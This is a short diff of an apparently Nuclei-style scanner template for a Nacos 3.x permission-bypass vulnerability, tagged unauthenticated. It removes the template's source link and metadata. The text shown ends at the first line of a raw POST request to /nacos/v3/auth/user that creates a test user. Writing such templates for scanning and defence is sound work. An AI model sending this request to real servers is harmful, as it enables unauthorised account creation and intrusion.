@@ -3,11 +3,8 @@ info:
   name: Nacos 3.x.x permission存在权限绕过漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tt2ypo0otsasunkw'
+  description: ''
   tags: unauth,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tt2ypo0otsasunkw
 http:
 - raw:
   - 'POST /nacos/v3/auth/user?username=test&password=1234@test HTTP/1.1
